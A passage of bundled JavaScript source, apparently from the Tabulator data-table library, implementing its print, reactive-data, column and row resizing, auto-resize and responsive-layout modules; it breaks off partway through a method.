    var touch = !(e2 instanceof MouseEvent), contentsEl, popup;
    if (contents instanceof HTMLElement) {
      contentsEl = contents;
    } else {
      contentsEl = document.createElement("div");
      contentsEl.innerHTML = contents;
    }
    contentsEl.classList.add("tabulator-popup");
    contentsEl.addEventListener("click", (e3) => {
      e3.stopPropagation();
    });
    if (!touch) {
      e2.preventDefault();
    }
    popup = this.popup(contentsEl);
    if (typeof renderedCallback === "function") {
      popup.renderCallback(renderedCallback);
    }
    if (e2) {
      popup.show(e2);
    } else {
      popup.show(component.getElement(), position || "center");
    }
    popup.hideOnBlur(() => {
      this.dispatchExternal("popupClosed", component.getComponent());
    });
    this.dispatchExternal("popupOpened", component.getComponent());
  }
}
class Print extends Module {
  static moduleName = "print";
  constructor(table) {
    super(table);
    this.element = false;
    this.manualBlock = false;
    this.beforeprintEventHandler = null;
    this.afterprintEventHandler = null;
    this.registerTableOption("printAsHtml", false);
    this.registerTableOption("printFormatter", false);
    this.registerTableOption("printHeader", false);
    this.registerTableOption("printFooter", false);
    this.registerTableOption("printStyled", true);
    this.registerTableOption("printRowRange", "visible");
    this.registerTableOption("printConfig", {});
    this.registerColumnOption("print");
    this.registerColumnOption("titlePrint");
  }
  initialize() {
    if (this.table.options.printAsHtml) {
      this.beforeprintEventHandler = this.replaceTable.bind(this);
      this.afterprintEventHandler = this.cleanup.bind(this);
      window.addEventListener("beforeprint", this.beforeprintEventHandler);
      window.addEventListener("afterprint", this.afterprintEventHandler);
      this.subscribe("table-destroy", this.destroy.bind(this));
    }
    this.registerTableFunction("print", this.printFullscreen.bind(this));
  }
  destroy() {
    if (this.table.options.printAsHtml) {
      window.removeEventListener("beforeprint", this.beforeprintEventHandler);
      window.removeEventListener("afterprint", this.afterprintEventHandler);
    }
  }
  ///////////////////////////////////
  ///////// Table Functions /////////
  ///////////////////////////////////
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  replaceTable() {
    if (!this.manualBlock) {
      this.element = document.createElement("div");
      this.element.classList.add("tabulator-print-table");
      this.element.appendChild(this.table.modules.export.generateTable(this.table.options.printConfig, this.table.options.printStyled, this.table.options.printRowRange, "print"));
      this.table.element.style.display = "none";
      this.table.element.parentNode.insertBefore(this.element, this.table.element);
    }
  }
  cleanup() {
    document.body.classList.remove("tabulator-print-fullscreen-hide");
    if (this.element && this.element.parentNode) {
      this.element.parentNode.removeChild(this.element);
      this.table.element.style.display = "";
    }
  }
  printFullscreen(visible, style, config) {
    var scrollX = window.scrollX, scrollY = window.scrollY, headerEl = document.createElement("div"), footerEl = document.createElement("div"), tableEl = this.table.modules.export.generateTable(typeof config != "undefined" ? config : this.table.options.printConfig, typeof style != "undefined" ? style : this.table.options.printStyled, visible || this.table.options.printRowRange, "print"), headerContent, footerContent;
    this.manualBlock = true;
    this.element = document.createElement("div");
    this.element.classList.add("tabulator-print-fullscreen");
    if (this.table.options.printHeader) {
      headerEl.classList.add("tabulator-print-header");
      headerContent = typeof this.table.options.printHeader == "function" ? this.table.options.printHeader.call(this.table) : this.table.options.printHeader;
      if (typeof headerContent == "string") {
        headerEl.innerHTML = headerContent;
      } else {
        headerEl.appendChild(headerContent);
      }
      this.element.appendChild(headerEl);
    }
    this.element.appendChild(tableEl);
    if (this.table.options.printFooter) {
      footerEl.classList.add("tabulator-print-footer");
      footerContent = typeof this.table.options.printFooter == "function" ? this.table.options.printFooter.call(this.table) : this.table.options.printFooter;
      if (typeof footerContent == "string") {
        footerEl.innerHTML = footerContent;
      } else {
        footerEl.appendChild(footerContent);
      }
      this.element.appendChild(footerEl);
    }
    document.body.classList.add("tabulator-print-fullscreen-hide");
    document.body.appendChild(this.element);
    if (this.table.options.printFormatter) {
      this.table.options.printFormatter(this.element, tableEl);
    }
    window.print();
    this.cleanup();
    window.scrollTo(scrollX, scrollY);
    this.manualBlock = false;
  }
}
class ReactiveData extends Module {
  static moduleName = "reactiveData";
  constructor(table) {
    super(table);
    this.data = false;
    this.blocked = false;
    this.origFuncs = {};
    this.currentVersion = 0;
    this.registerTableOption("reactiveData", false);
  }
  initialize() {
    if (this.table.options.reactiveData) {
      this.subscribe("cell-value-save-before", this.block.bind(this, "cellsave"));
      this.subscribe("cell-value-save-after", this.unblock.bind(this, "cellsave"));
      this.subscribe("row-data-save-before", this.block.bind(this, "rowsave"));
      this.subscribe("row-data-save-after", this.unblock.bind(this, "rowsave"));
      this.subscribe("row-data-init-after", this.watchRow.bind(this));
      this.subscribe("data-processing", this.watchData.bind(this));
      this.subscribe("table-destroy", this.unwatchData.bind(this));
    }
  }
  watchData(data) {
    var self = this, version;
    this.currentVersion++;
    version = this.currentVersion;
    this.unwatchData();
    this.data = data;
    this.origFuncs.push = data.push;
    Object.defineProperty(this.data, "push", {
      enumerable: false,
      configurable: true,
      value: function() {
        var args = Array.from(arguments), result;
        if (!self.blocked && version === self.currentVersion) {
          self.block("data-push");
          args.forEach((arg) => {
            self.table.rowManager.addRowActual(arg, false);
          });
          result = self.origFuncs.push.apply(data, arguments);
          self.unblock("data-push");
        }
        return result;
      }
    });
    this.origFuncs.unshift = data.unshift;
    Object.defineProperty(this.data, "unshift", {
      enumerable: false,
      configurable: true,
      value: function() {
        var args = Array.from(arguments), result;
        if (!self.blocked && version === self.currentVersion) {
          self.block("data-unshift");
          args.forEach((arg) => {
            self.table.rowManager.addRowActual(arg, true);
          });
          result = self.origFuncs.unshift.apply(data, arguments);
          self.unblock("data-unshift");
        }
        return result;
      }
    });
    this.origFuncs.shift = data.shift;
    Object.defineProperty(this.data, "shift", {
      enumerable: false,
      configurable: true,
      value: function() {
        var row, result;
        if (!self.blocked && version === self.currentVersion) {
          self.block("data-shift");
          if (self.data.length) {
            row = self.table.rowManager.getRowFromDataObject(self.data[0]);
            if (row) {
              row.deleteActual();
            }
          }
          result = self.origFuncs.shift.call(data);
          self.unblock("data-shift");
        }
        return result;
      }
    });
    this.origFuncs.pop = data.pop;
    Object.defineProperty(this.data, "pop", {
      enumerable: false,
      configurable: true,
      value: function() {
        var row, result;
        if (!self.blocked && version === self.currentVersion) {
          self.block("data-pop");
          if (self.data.length) {
            row = self.table.rowManager.getRowFromDataObject(self.data[self.data.length - 1]);
            if (row) {
              row.deleteActual();
            }
          }
          result = self.origFuncs.pop.call(data);
          self.unblock("data-pop");
        }
        return result;
      }
    });
    this.origFuncs.splice = data.splice;
    Object.defineProperty(this.data, "splice", {
      enumerable: false,
      configurable: true,
      value: function() {
        var args = Array.from(arguments), start2 = args[0] < 0 ? data.length + args[0] : args[0], end2 = args[1], newRows = args[2] ? args.slice(2) : false, startRow, result;
        if (!self.blocked && version === self.currentVersion) {
          self.block("data-splice");
          if (newRows) {
            startRow = data[start2] ? self.table.rowManager.getRowFromDataObject(data[start2]) : false;
            if (startRow) {
              newRows.forEach((rowData) => {
                self.table.rowManager.addRowActual(rowData, true, startRow, true);
              });
            } else {
              newRows = newRows.slice().reverse();
              newRows.forEach((rowData) => {
                self.table.rowManager.addRowActual(rowData, true, false, true);
              });
            }
          }
          if (end2 !== 0) {
            var oldRows = data.slice(start2, typeof args[1] === "undefined" ? args[1] : start2 + end2);
            oldRows.forEach((rowData, i2) => {
              var row = self.table.rowManager.getRowFromDataObject(rowData);
              if (row) {
                row.deleteActual(i2 !== oldRows.length - 1);
              }
            });
          }
          if (newRows || end2 !== 0) {
            self.table.rowManager.reRenderInPosition();
          }
          result = self.origFuncs.splice.apply(data, arguments);
          self.unblock("data-splice");
        }
        return result;
      }
    });
  }
  unwatchData() {
    if (this.data !== false) {
      for (var key in this.origFuncs) {
        Object.defineProperty(this.data, key, {
          enumerable: true,
          configurable: true,
          writable: true,
          value: this.origFuncs.key
        });
      }
    }
  }
  watchRow(row) {
    var data = row.getData();
    for (var key in data) {
      this.watchKey(row, data, key);
    }
    if (this.table.options.dataTree) {
      this.watchTreeChildren(row);
    }
  }
  watchTreeChildren(row) {
    var self = this, childField = row.getData()[this.table.options.dataTreeChildField], origFuncs = {};
    if (childField) {
      origFuncs.push = childField.push;
      Object.defineProperty(childField, "push", {
        enumerable: false,
        configurable: true,
        value: () => {
          if (!self.blocked) {
            self.block("tree-push");
            var result = origFuncs.push.apply(childField, arguments);
            this.rebuildTree(row);
            self.unblock("tree-push");
          }
          return result;
        }
      });
      origFuncs.unshift = childField.unshift;
      Object.defineProperty(childField, "unshift", {
        enumerable: false,
        configurable: true,
        value: () => {
          if (!self.blocked) {
            self.block("tree-unshift");
            var result = origFuncs.unshift.apply(childField, arguments);
            this.rebuildTree(row);
            self.unblock("tree-unshift");
          }
          return result;
        }
      });
      origFuncs.shift = childField.shift;
      Object.defineProperty(childField, "shift", {
        enumerable: false,
        configurable: true,
        value: () => {
          if (!self.blocked) {
            self.block("tree-shift");
            var result = origFuncs.shift.call(childField);
            this.rebuildTree(row);
            self.unblock("tree-shift");
          }
          return result;
        }
      });
      origFuncs.pop = childField.pop;
      Object.defineProperty(childField, "pop", {
        enumerable: false,
        configurable: true,
        value: () => {
          if (!self.blocked) {
            self.block("tree-pop");
            var result = origFuncs.pop.call(childField);
            this.rebuildTree(row);
            self.unblock("tree-pop");
          }
          return result;
        }
      });
      origFuncs.splice = childField.splice;
      Object.defineProperty(childField, "splice", {
        enumerable: false,
        configurable: true,
        value: () => {
          if (!self.blocked) {
            self.block("tree-splice");
            var result = origFuncs.splice.apply(childField, arguments);
            this.rebuildTree(row);
            self.unblock("tree-splice");
          }
          return result;
        }
      });
    }
  }
  rebuildTree(row) {
    this.table.modules.dataTree.initializeRow(row);
    this.table.modules.dataTree.layoutRow(row);
    this.table.rowManager.refreshActiveData("tree", false, true);
  }
  watchKey(row, data, key) {
    var self = this, props = Object.getOwnPropertyDescriptor(data, key), value = data[key], version = this.currentVersion;
    Object.defineProperty(data, key, {
      set: (newValue) => {
        value = newValue;
        if (!self.blocked && version === self.currentVersion) {
          self.block("key");
          var update2 = {};
          update2[key] = newValue;
          row.updateData(update2);
          self.unblock("key");
        }
        if (props.set) {
          props.set(newValue);
        }
      },
      get: () => {
        if (props.get) {
          props.get();
        }
        return value;
      }
    });
  }
  unwatchRow(row) {
    var data = row.getData();
    for (var key in data) {
      Object.defineProperty(data, key, {
        value: data[key]
      });
    }
  }
  block(key) {
    if (!this.blocked) {
      this.blocked = key;
    }
  }
  unblock(key) {
    if (this.blocked === key) {
      this.blocked = false;
    }
  }
}
class ResizeColumns extends Module {
  static moduleName = "resizeColumns";
  constructor(table) {
    super(table);
    this.startColumn = false;
    this.startX = false;
    this.startWidth = false;
    this.latestX = false;
    this.handle = null;
    this.initialNextColumn = null;
    this.nextColumn = null;
    this.initialized = false;
    this.registerColumnOption("resizable", true);
    this.registerTableOption("resizableColumnFit", false);
    this.registerTableOption("resizableColumnGuide", false);
  }
  initialize() {
    this.subscribe("column-rendered", this.layoutColumnHeader.bind(this));
  }
  initializeEventWatchers() {
    if (!this.initialized) {
      this.subscribe("cell-rendered", this.layoutCellHandles.bind(this));
      this.subscribe("cell-delete", this.deInitializeComponent.bind(this));
      this.subscribe("cell-height", this.resizeHandle.bind(this));
      this.subscribe("column-moved", this.columnLayoutUpdated.bind(this));
      this.subscribe("column-hide", this.deInitializeColumn.bind(this));
      this.subscribe("column-show", this.columnLayoutUpdated.bind(this));
      this.subscribe("column-width", this.columnWidthUpdated.bind(this));
      this.subscribe("column-delete", this.deInitializeComponent.bind(this));
      this.subscribe("column-height", this.resizeHandle.bind(this));
      this.initialized = true;
    }
  }
  layoutCellHandles(cell) {
    if (cell.row.type === "row") {
      this.deInitializeComponent(cell);
      this.initializeColumn("cell", cell, cell.column, cell.element);
    }
  }
  layoutColumnHeader(column) {
    if (column.definition.resizable) {
      this.initializeEventWatchers();
      this.deInitializeComponent(column);
      this.initializeColumn("header", column, column, column.element);
    }
  }
  columnLayoutUpdated(column) {
    var prev = column.prevColumn();
    this.reinitializeColumn(column);
    if (prev) {
      this.reinitializeColumn(prev);
    }
  }
  columnWidthUpdated(column) {
    if (column.modules.frozen) {
      if (this.table.modules.frozenColumns.leftColumns.includes(column)) {
        this.table.modules.frozenColumns.leftColumns.forEach((col) => {
          this.reinitializeColumn(col);
        });
      } else if (this.table.modules.frozenColumns.rightColumns.includes(column)) {
        this.table.modules.frozenColumns.rightColumns.forEach((col) => {
          this.reinitializeColumn(col);
        });
      }
    }
  }
  frozenColumnOffset(column) {
    var offset2 = false;
    if (column.modules.frozen) {
      offset2 = column.modules.frozen.marginValue;
      if (column.modules.frozen.position === "left") {
        offset2 += column.getWidth() - 3;
      } else {
        if (offset2) {
          offset2 -= 3;
        }
      }
    }
    return offset2 !== false ? offset2 + "px" : false;
  }
  reinitializeColumn(column) {
    var frozenOffset = this.frozenColumnOffset(column);
    column.cells.forEach((cell) => {
      if (cell.modules.resize && cell.modules.resize.handleEl) {
        if (frozenOffset) {
          cell.modules.resize.handleEl.style[column.modules.frozen.position] = frozenOffset;
          cell.modules.resize.handleEl.style["z-index"] = 11;
        }
        cell.element.after(cell.modules.resize.handleEl);
      }
    });
    if (column.modules.resize && column.modules.resize.handleEl) {
      if (frozenOffset) {
        column.modules.resize.handleEl.style[column.modules.frozen.position] = frozenOffset;
      }
      column.element.after(column.modules.resize.handleEl);
    }
  }
  initializeColumn(type, component, column, element) {
    var self = this, variableHeight = false, mode = column.definition.resizable, config = {}, nearestColumn = column.getLastColumn();
    if (type === "header") {
      variableHeight = column.definition.formatter == "textarea" || column.definition.variableHeight;
      config = { variableHeight };
    }
    if ((mode === true || mode == type) && this._checkResizability(nearestColumn)) {
      var handle2 = document.createElement("span");
      handle2.className = "tabulator-col-resize-handle";
      handle2.addEventListener("click", function(e2) {
        e2.stopPropagation();
      });
      var handleDown = function(e2) {
        self.startColumn = column;
        self.initialNextColumn = self.nextColumn = nearestColumn.nextColumn();
        self._mouseDown(e2, nearestColumn, handle2);
      };
      handle2.addEventListener("mousedown", handleDown);
      handle2.addEventListener("touchstart", handleDown, { passive: true });
      handle2.addEventListener("dblclick", (e2) => {
        var oldWidth = nearestColumn.getWidth();
        e2.stopPropagation();
        nearestColumn.reinitializeWidth(true);
        if (oldWidth !== nearestColumn.getWidth()) {
          self.dispatch("column-resized", nearestColumn);
          self.dispatchExternal("columnResized", nearestColumn.getComponent());
        }
      });
      if (column.modules.frozen) {
        handle2.style.position = "sticky";
        handle2.style[column.modules.frozen.position] = this.frozenColumnOffset(column);
      }
      config.handleEl = handle2;
      if (element.parentNode && column.visible) {
        element.after(handle2);
      }
    }
    component.modules.resize = config;
  }
  deInitializeColumn(column) {
    this.deInitializeComponent(column);
    column.cells.forEach((cell) => {
      this.deInitializeComponent(cell);
    });
  }
  deInitializeComponent(component) {
    var handleEl;
    if (component.modules.resize) {
      handleEl = component.modules.resize.handleEl;
      if (handleEl && handleEl.parentElement) {
        handleEl.parentElement.removeChild(handleEl);
      }
    }
  }
  resizeHandle(component, height) {
    if (component.modules.resize && component.modules.resize.handleEl) {
      component.modules.resize.handleEl.style.height = height;
    }
  }
  resize(e2, column) {
    var x = typeof e2.clientX === "undefined" ? e2.touches[0].clientX : e2.clientX, startDiff = x - this.startX, moveDiff = x - this.latestX, blockedBefore, blockedAfter;
    this.latestX = x;
    if (this.table.rtl) {
      startDiff = -startDiff;
      moveDiff = -moveDiff;
    }
    blockedBefore = column.width == column.minWidth || column.width == column.maxWidth;
    column.setWidth(this.startWidth + startDiff);
    blockedAfter = column.width == column.minWidth || column.width == column.maxWidth;
    if (moveDiff < 0) {
      this.nextColumn = this.initialNextColumn;
    }
    if (this.table.options.resizableColumnFit && this.nextColumn && !(blockedBefore && blockedAfter)) {
      let colWidth = this.nextColumn.getWidth();
      if (moveDiff > 0) {
        if (colWidth <= this.nextColumn.minWidth) {
          this.nextColumn = this.nextColumn.nextColumn();
        }
      }
      if (this.nextColumn) {
        this.nextColumn.setWidth(this.nextColumn.getWidth() - moveDiff);
      }
    }
    this.table.columnManager.rerenderColumns(true);
    if (!this.table.browserSlow && column.modules.resize && column.modules.resize.variableHeight) {
      column.checkCellHeights();
    }
  }
  calcGuidePosition(e2, column, handle2) {
    var mouseX = typeof e2.clientX === "undefined" ? e2.touches[0].clientX : e2.clientX, handleX = handle2.getBoundingClientRect().x - this.table.element.getBoundingClientRect().x, tableX = this.table.element.getBoundingClientRect().x, columnX = column.element.getBoundingClientRect().left - tableX, mouseDiff = mouseX - this.startX, pos = Math.max(handleX + mouseDiff, columnX + column.minWidth);
    if (column.maxWidth) {
      pos = Math.min(pos, columnX + column.maxWidth);
    }
    return pos;
  }
  _checkResizability(column) {
    return column.definition.resizable;
  }
  _mouseDown(e2, column, handle2) {
    var self = this, guideEl;
    this.dispatchExternal("columnResizing", column.getComponent());
    if (self.table.options.resizableColumnGuide) {
      guideEl = document.createElement("span");
      guideEl.classList.add("tabulator-col-resize-guide");
      self.table.element.appendChild(guideEl);
      setTimeout(() => {
        guideEl.style.left = self.calcGuidePosition(e2, column, handle2) + "px";
      });
    }
    self.table.element.classList.add("tabulator-block-select");
    function mouseMove(e3) {
      if (self.table.options.resizableColumnGuide) {
        guideEl.style.left = self.calcGuidePosition(e3, column, handle2) + "px";
      } else {
        self.resize(e3, column);
      }
    }
    function mouseUp(e3) {
      if (self.table.options.resizableColumnGuide) {
        self.resize(e3, column);
        guideEl.remove();
      }
      if (self.startColumn.modules.edit) {
        self.startColumn.modules.edit.blocked = false;
      }
      if (self.table.browserSlow && column.modules.resize && column.modules.resize.variableHeight) {
        column.checkCellHeights();
      }
      document.body.removeEventListener("mouseup", mouseUp);
      document.body.removeEventListener("mousemove", mouseMove);
      handle2.removeEventListener("touchmove", mouseMove);
      handle2.removeEventListener("touchend", mouseUp);
      self.table.element.classList.remove("tabulator-block-select");
      if (self.startWidth !== column.getWidth()) {
        self.table.columnManager.verticalAlignHeaders();
        self.dispatch("column-resized", column);
        self.dispatchExternal("columnResized", column.getComponent());
      }
    }
    e2.stopPropagation();
    if (self.startColumn.modules.edit) {
      self.startColumn.modules.edit.blocked = true;
    }
    self.startX = typeof e2.clientX === "undefined" ? e2.touches[0].clientX : e2.clientX;
    self.latestX = self.startX;
    self.startWidth = column.getWidth();
    document.body.addEventListener("mousemove", mouseMove);
    document.body.addEventListener("mouseup", mouseUp);
    handle2.addEventListener("touchmove", mouseMove, { passive: true });
    handle2.addEventListener("touchend", mouseUp);
  }
}
class ResizeRows extends Module {
  static moduleName = "resizeRows";
  constructor(table) {
    super(table);
    this.startColumn = false;
    this.startY = false;
    this.startHeight = false;
    this.handle = null;
    this.prevHandle = null;
    this.registerTableOption("resizableRows", false);
    this.registerTableOption("resizableRowGuide", false);
  }
  initialize() {
    if (this.table.options.resizableRows) {
      this.subscribe("row-layout-after", this.initializeRow.bind(this));
    }
  }
  initializeRow(row) {
    var self = this, rowEl = row.getElement();
    var handle2 = document.createElement("div");
    handle2.className = "tabulator-row-resize-handle";
    var prevHandle = document.createElement("div");
    prevHandle.className = "tabulator-row-resize-handle prev";
    handle2.addEventListener("click", function(e2) {
      e2.stopPropagation();
    });
    var handleDown = function(e2) {
      self.startRow = row;
      self._mouseDown(e2, row, handle2);
    };
    handle2.addEventListener("mousedown", handleDown);
    handle2.addEventListener("touchstart", handleDown, { passive: true });
    prevHandle.addEventListener("click", function(e2) {
      e2.stopPropagation();
    });
    var prevHandleDown = function(e2) {
      var prevRow = self.table.rowManager.prevDisplayRow(row);
      if (prevRow) {
        self.startRow = prevRow;
        self._mouseDown(e2, prevRow, prevHandle);
      }
    };
    prevHandle.addEventListener("mousedown", prevHandleDown);
    prevHandle.addEventListener("touchstart", prevHandleDown, { passive: true });
    rowEl.appendChild(handle2);
    rowEl.appendChild(prevHandle);
  }
  resize(e2, row) {
    row.setHeight(this.startHeight + ((typeof e2.screenY === "undefined" ? e2.touches[0].screenY : e2.screenY) - this.startY));
  }
  calcGuidePosition(e2, row, handle2) {
    var mouseY = typeof e2.screenY === "undefined" ? e2.touches[0].screenY : e2.screenY, handleY = handle2.getBoundingClientRect().y - this.table.element.getBoundingClientRect().y, tableY = this.table.element.getBoundingClientRect().y, rowY = row.element.getBoundingClientRect().top - tableY, mouseDiff = mouseY - this.startY;
    return Math.max(handleY + mouseDiff, rowY);
  }
  _mouseDown(e2, row, handle2) {
    var self = this, guideEl;
    self.dispatchExternal("rowResizing", row.getComponent());
    if (self.table.options.resizableRowGuide) {
      guideEl = document.createElement("span");
      guideEl.classList.add("tabulator-row-resize-guide");
      self.table.element.appendChild(guideEl);
      setTimeout(() => {
        guideEl.style.top = self.calcGuidePosition(e2, row, handle2) + "px";
      });
    }
    self.table.element.classList.add("tabulator-block-select");
    function mouseMove(e3) {
      if (self.table.options.resizableRowGuide) {
        guideEl.style.top = self.calcGuidePosition(e3, row, handle2) + "px";
      } else {
        self.resize(e3, row);
      }
    }
    function mouseUp(e3) {
      if (self.table.options.resizableRowGuide) {
        self.resize(e3, row);
        guideEl.remove();
      }
      document.body.removeEventListener("mouseup", mouseMove);
      document.body.removeEventListener("mousemove", mouseMove);
      handle2.removeEventListener("touchmove", mouseMove);
      handle2.removeEventListener("touchend", mouseUp);
      self.table.element.classList.remove("tabulator-block-select");
      self.dispatchExternal("rowResized", row.getComponent());
    }
    e2.stopPropagation();
    self.startY = typeof e2.screenY === "undefined" ? e2.touches[0].screenY : e2.screenY;
    self.startHeight = row.getHeight();
    document.body.addEventListener("mousemove", mouseMove);
    document.body.addEventListener("mouseup", mouseUp);
    handle2.addEventListener("touchmove", mouseMove, { passive: true });
    handle2.addEventListener("touchend", mouseUp);
  }
}
class ResizeTable extends Module {
  static moduleName = "resizeTable";
  constructor(table) {
    super(table);
    this.binding = false;
    this.visibilityObserver = false;
    this.resizeObserver = false;
    this.containerObserver = false;
    this.tableHeight = 0;
    this.tableWidth = 0;
    this.containerHeight = 0;
    this.containerWidth = 0;
    this.autoResize = false;
    this.visible = false;
    this.initialized = false;
    this.initialRedraw = false;
    this.registerTableOption("autoResize", true);
  }
  initialize() {
    if (this.table.options.autoResize) {
      var table = this.table, tableStyle;
      this.tableHeight = table.element.clientHeight;
      this.tableWidth = table.element.clientWidth;
      if (table.element.parentNode) {
        this.containerHeight = table.element.parentNode.clientHeight;
        this.containerWidth = table.element.parentNode.clientWidth;
      }
      if (typeof IntersectionObserver !== "undefined" && typeof ResizeObserver !== "undefined" && table.rowManager.getRenderMode() === "virtual") {
        this.initializeVisibilityObserver();
        this.autoResize = true;
        this.resizeObserver = new ResizeObserver((entry) => {
          if (!table.browserMobile || table.browserMobile && (!table.modules.edit || table.modules.edit && !table.modules.edit.currentCell)) {
            var nodeHeight = Math.floor(entry[0].contentRect.height);
            var nodeWidth = Math.floor(entry[0].contentRect.width);
            if (this.tableHeight != nodeHeight || this.tableWidth != nodeWidth) {
              this.tableHeight = nodeHeight;
              this.tableWidth = nodeWidth;
              if (table.element.parentNode) {
                this.containerHeight = table.element.parentNode.clientHeight;
                this.containerWidth = table.element.parentNode.clientWidth;
              }
              this.redrawTable();
            }
          }
        });
        this.resizeObserver.observe(table.element);
        tableStyle = window.getComputedStyle(table.element);
        if (this.table.element.parentNode && !this.table.rowManager.fixedHeight && (tableStyle.getPropertyValue("max-height") || tableStyle.getPropertyValue("min-height"))) {
          this.containerObserver = new ResizeObserver((entry) => {
            if (!table.browserMobile || table.browserMobile && (!table.modules.edit || table.modules.edit && !table.modules.edit.currentCell)) {
              var nodeHeight = Math.floor(entry[0].contentRect.height);
              var nodeWidth = Math.floor(entry[0].contentRect.width);
              if (this.containerHeight != nodeHeight || this.containerWidth != nodeWidth) {
                this.containerHeight = nodeHeight;
                this.containerWidth = nodeWidth;
                this.tableHeight = table.element.clientHeight;
                this.tableWidth = table.element.clientWidth;
              }
              this.redrawTable();
            }
          });
          this.containerObserver.observe(this.table.element.parentNode);
        }
        this.subscribe("table-resize", this.tableResized.bind(this));
      } else {
        this.binding = function() {
          if (!table.browserMobile || table.browserMobile && (!table.modules.edit || table.modules.edit && !table.modules.edit.currentCell)) {
            table.columnManager.rerenderColumns(true);
            table.redraw();
          }
        };
        window.addEventListener("resize", this.binding);
      }
      this.subscribe("table-destroy", this.clearBindings.bind(this));
    }
  }
  initializeVisibilityObserver() {
    this.visibilityObserver = new IntersectionObserver((entries) => {
      this.visible = entries[0].isIntersecting;
      if (!this.initialized) {
        this.initialized = true;
        this.initialRedraw = !this.visible;
      } else {
        if (this.visible) {
          this.redrawTable(this.initialRedraw);
          this.initialRedraw = false;
        }
      }
    });
    this.visibilityObserver.observe(this.table.element);
  }
  redrawTable(force) {
    if (this.initialized && this.visible) {
      this.table.columnManager.rerenderColumns(true);
      this.table.redraw(force);
    }
  }
  tableResized() {
    this.table.rowManager.redraw();
  }
  clearBindings() {
    if (this.binding) {
      window.removeEventListener("resize", this.binding);
    }
    if (this.resizeObserver) {
      this.resizeObserver.unobserve(this.table.element);
    }
    if (this.visibilityObserver) {
      this.visibilityObserver.unobserve(this.table.element);
    }
    if (this.containerObserver) {
      this.containerObserver.unobserve(this.table.element.parentNode);
    }
  }
}
function responsiveCollapse(cell, formatterParams, onRendered) {
  var el = document.createElement("div"), config = cell.getRow()._row.modules.responsiveLayout;
  el.classList.add("tabulator-responsive-collapse-toggle");
  el.innerHTML = `<svg class='tabulator-responsive-collapse-toggle-open' viewbox="0 0 24 24">
  <line x1="7" y1="12" x2="17" y2="12" fill="none" stroke-width="3" stroke-linecap="round" />
  <line y1="7" x1="12" y2="17" x2="12" fill="none" stroke-width="3" stroke-linecap="round" />
</svg>

<svg class='tabulator-responsive-collapse-toggle-close' viewbox="0 0 24 24">
  <line x1="7" y1="12" x2="17" y2="12"  fill="none" stroke-width="3" stroke-linecap="round" />
</svg>`;
  cell.getElement().classList.add("tabulator-row-handle");
  function toggleList(isOpen) {
    var collapseEl = config.element;
    config.open = isOpen;
    if (collapseEl) {
      if (config.open) {
        el.classList.add("open");
        collapseEl.style.display = "";
      } else {
        el.classList.remove("open");
        collapseEl.style.display = "none";
      }
    }
  }
  el.addEventListener("click", function(e2) {
    e2.stopImmediatePropagation();
    toggleList(!config.open);
    cell.getTable().rowManager.adjustTableSize();
  });
  toggleList(config.open);
  return el;
}
var extensions$2 = {
  format: {
    formatters: {
      responsiveCollapse
    }
  }
};
class ResponsiveLayout extends Module {
  static moduleName = "responsiveLayout";
  static moduleExtensions = extensions$2;
  constructor(table) {
    super(table);
    this.columns = [];
    this.hiddenColumns = [];
    this.mode = "";
    this.index = 0;
    this.collapseFormatter = [];
    this.collapseStartOpen = true;
    this.collapseHandleColumn = false;
    this.registerTableOption("responsiveLayout", false);
    this.registerTableOption("responsiveLayoutCollapseStartOpen", true);
    this.registerTableOption("responsiveLayoutCollapseUseFormatters", true);
    this.registerTableOption("responsiveLayoutCollapseFormatter", false);
    this.registerColumnOption("responsive");
  }
  //generate responsive columns list
  initialize() {
    if (this.table.options.responsiveLayout) {
      this.subscribe("column-layout", this.initializeColumn.bind(this));
      this.subscribe("column-show", this.updateColumnVisibility.bind(this));
      this.subscribe("column-hide", this.updateColumnVisibility.bind(this));
      this.subscribe("columns-loaded", this.initializeResponsivity.bind(this));
      this.subscribe("column-moved", this.initializeResponsivity.bind(this));
      this.subscribe("column-add", this.initializeResponsivity.bind(this));
      this.subscribe("column-delete", this.initializeResponsivity.bind(this));
      this.subscribe("table-redrawing", this.tableRedraw.bind(this));
      if (this.table.options.responsiveLayout === "collapse") {
        this.subscribe("row-data-changed", this.generateCollapsedRowContent.bind(this));
        this.subscribe("row-init", this.initializeRow.bind(this));
        this.subscribe("row-layout", this.layoutRow.bind(this));
      }
    }
  }
  tableRedraw(force) {
    if (["fitColumns", "fitDataStretch"].indexOf(this.layoutMode()) === -1) {
      if (!force) {
        this.update();
      }
    }
  }
  initializeResponsivity() {
    var columns = [];
    this.mode = this.table.options.responsiveLayout;
    this.collapseFormatter = this.table.options.responsiveLayoutCollapseFormatter || this.formatCollapsedData;
    this.collapseStartOpen = this.table.options.responsiveLayoutCollapseStartOpen;
    this.hiddenColumns = [];
    if (this.collapseFormatter) {
      this.collapseFormatter = this.collapseFormatter.bind(this.table);
    }
    this.table.columnManager.columnsByIndex.forEach((column, i2) => {
      if (column.modules.responsive) {
        if (column.modules.responsive.order && column.modules.responsive.visible) {
          column.modules.responsive.index = i2;
          columns.push(column);
          if (!column.visible && this.mode === "collapse") {
            this.hiddenColumns.push(column);
          }
        }
      }
    });
    columns = columns.reverse();
    columns = columns.sort((a, b) => {
      var diff2 = b.modules.responsive.order - a.modules.responsive.order;
      return diff2 || b.modules.responsive.index - a.modules.responsive.index;
    });
    this.columns = columns;
    if (this.mode === "collapse") {
      this.generateCollapsedContent();
    }
    for (let col of this.table.columnManager.columnsByIndex) {
      if (col.definition.formatter == "responsiveCollapse") {
        this.collapseHandleColumn = col;
        break;
      }
    }
    if (this.collapseHandleColumn) {
      if (this.hiddenColumns.length) {
        this.collapseHandleColumn.show();
      } else {
        this.collapseHandleColumn.hide();
      }
    }
  }
  //define layout information
  initializeColumn(column) {
    var def = column.getDefinition();
    column.modules.responsive = { order: typeof def.responsive === "undefined" ? 1 : def.responsive, visible: def.visible === false ? false : true };
  }
  initializeRow(row) {
    var el;
    if (row.type !== "calc") {
      el = document.createElement("div");
      el.classList.add("tabulator-responsive-collapse");
      row.modules.responsiveLayout = {
        element: el,
        open: this.collapseStartOpen
      };
      if (!this.collapseStartOpen) {
        el.style.display = "none";
      }
    }
  }
  layoutRow(row) {
    var rowEl = row.getElement();
    if (row.modules.responsiveLayout) {
      rowEl.appendChild(row.modules.responsiveLayout.element);
      this.generateCollapsedRowContent(row);
    }
  }
  //update column visibility
  updateColumnVisibility(column, responsiveToggle) {
    if (!responsiveToggle && column.modules.responsive) {
